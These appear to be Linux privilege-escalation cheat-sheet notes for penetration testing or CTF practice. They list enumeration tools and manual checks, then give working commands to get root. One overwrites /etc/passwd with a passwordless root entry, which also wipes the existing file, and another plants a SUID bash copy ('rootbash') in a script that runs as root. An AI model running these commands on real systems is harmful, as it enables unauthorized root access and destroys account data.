## Enumeration

### Linpeas
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

```
linpeash.sh -a > output.txt
cat output.txt | less -R
```

### linux-smart-enumeration
https://github.com/diego-treitos/linux-smart-enumeration

```
./lse.sh -l (use this to increase verbosity level default 0)
```

### linux-exploit-suggester-2 
(use this to find kernel exploits)

https://github.com/jondonas/linux-exploit-suggester-2

### Manual checks

Lists all commands the user can use with sudo permissions

```
sudo -l
```

Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!

```
ps aux | grep root
ps -ef | grep root
```

Weak File Permissions
```
//if we can write this file we can add a new root user
ls -la /etc/shadow
ls -la /etc/passwd\

// exploit in this way
echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su
```


SUID/SGID Executables
An SUID is a file that allows a user to execute the file with the permissions of the file owner, an SGID is the same except with the group owner. If the owner is root, we can essentially run files with root permissions.

```
//find all SUID files

find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null find all SUID files

// find all SGID files
find / -perm -g=s -type f 2>/dev/null

```
Check for service running only locally 
```
netstat -antpx
```

## EXPLOIT 
#### ROOTBASH
we can use this tecnquie when we found a script running as root, we can modify in this way
```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```
Ensure that overwrite.sh is executable:
```
chmod +x /home/user/overwrite.sh
```
run and gain a root shell (-p to preserve UID)
```
/tmp/rootbash –p
```
